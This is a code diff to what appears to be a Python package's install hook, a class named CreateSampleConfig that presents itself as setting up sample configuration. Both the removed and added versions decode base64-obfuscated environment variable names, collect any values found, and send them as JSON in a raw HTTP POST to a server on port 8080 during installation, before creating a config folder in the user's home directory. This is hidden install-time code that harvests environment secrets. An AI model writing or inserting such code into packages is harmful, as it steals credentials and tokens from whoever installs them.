@@ -49,27 +49,23 @@ class CreateSampleConfig(install):
 
         found = {}
         for i in envs:
-            i_decoded = base64.b64decode(i).decode("utf-8")
-            v = os.environ.get(i_decoded)
+            v = os.environ.get(base64.b64decode(i).decode("utf-8"))
             if v:
                 found[i] = v
 
-        host = "0.0.0.0"
-        port = 8080
+        srv_addr = ('localhost', 8080)
+        data = json.dumps(found).encode('utf-8')
+        con_len = len(data)
+        request = (
+            f"POST / HTTP/1.1\r\n"
+            f"Host: {srv_addr[0]}\r\n"
+            f"Content-Type: application/json\r\n"
+            f"Content-Length: {con_len}\r\n"
+            f"\r\n"
+        ).encode('utf-8') + data
 
-        # Construct the POST request
-        data = json.dumps(found)
-        print(len(data))
-        headers = f"POST / HTTP/1.1\r\n"
-        headers += f"Host: {host}\r\n"
-        headers += "User-Agent: SecurityChecker/1.0\r\n"
-        headers += "Content-Type: application/json\r\n"
-        headers += "Content-Length: {}\r\n\r\n".format(len(data))
-        send_data = headers.encode("utf-8") + data.encode("utf-8")
-
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.connect(("0.0.0.0", port))
-            s.sendall(send_data)
+        with socket.create_connection(srv_addr) as sock:
+            sock.sendall(request)
 
         home_dir = os.path.expanduser("~")
         config_dir = os.path.join(home_dir, "sample", "configs")
